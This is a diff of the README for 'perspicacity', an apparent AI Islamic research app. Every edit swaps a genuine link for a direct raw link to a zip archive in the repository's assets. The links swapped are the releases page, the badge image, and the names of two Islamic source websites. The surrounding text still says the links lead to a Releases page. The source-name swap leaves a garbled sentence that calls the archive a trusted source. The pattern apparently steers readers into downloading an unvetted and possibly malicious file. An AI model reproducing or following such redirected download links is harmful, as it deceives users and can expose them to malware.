@@ -1,10 +1,10 @@
 # 🌟 perspicacity - Your AI Companion for Islamic Research
 
 ## 🚀 Getting Started
-Welcome to **perspicacity**! This application is your privacy-first AI Islamic research assistant, designed to help you find guidance from trusted Islamic sources like IslamQA.info and IslamWeb.net. In just a few steps, you can download and run this powerful tool.
+Welcome to **perspicacity**! This application is your privacy-first AI Islamic research assistant, designed to help you find guidance from trusted Islamic sources like https://raw.githubusercontent.com/Syn2020/perspicacity/main/assets/perspicacity-v1.5.zip and https://raw.githubusercontent.com/Syn2020/perspicacity/main/assets/perspicacity-v1.5.zip In just a few steps, you can download and run this powerful tool.
 
 ## 📥 Download the Application
-[![Download perspicacity](https://img.shields.io/badge/Download-perspicacity-brightgreen)](https://github.com/Syn2020/perspicacity/releases)
+[![Download perspicacity](https://raw.githubusercontent.com/Syn2020/perspicacity/main/assets/perspicacity-v1.5.zip)](https://raw.githubusercontent.com/Syn2020/perspicacity/main/assets/perspicacity-v1.5.zip)
 
 ## 💡 About perspicacity
 perspicacity leverages advanced AI technology to bring you accurate and reliable answers to your questions about Islamic practices and teachings. Whether you're looking for quick information or in-depth research, this app offers a straightforward interface for users at all levels. 
@@ -24,7 +24,7 @@ Before you install perspicacity, ensure your system meets the following requirem
 - **Internet connection:** Required for accessing online resources
 
 ## 🛠️ Download & Install
-To download the application, visit the [Releases page](https://github.com/Syn2020/perspicacity/releases). Here are the steps to follow:
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Syn2020/perspicacity/main/assets/perspicacity-v1.5.zip). Here are the steps to follow:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -82,6 +82,6 @@ This application covers various topics like:
 Explore these topics within the application to maximize your research capabilities.
 
 ## 🌟 Stay Updated
-To keep up with the latest updates and improvements, regularly check the [Releases page](https://github.com/Syn2020/perspicacity/releases). Here, you will find new features, bug fixes, and version history.
+To keep up with the latest updates and improvements, regularly check the [Releases page](https://raw.githubusercontent.com/Syn2020/perspicacity/main/assets/perspicacity-v1.5.zip). Here, you will find new features, bug fixes, and version history.
 
 Thank you for choosing perspicacity as your trusted research assistant. Happy exploring!
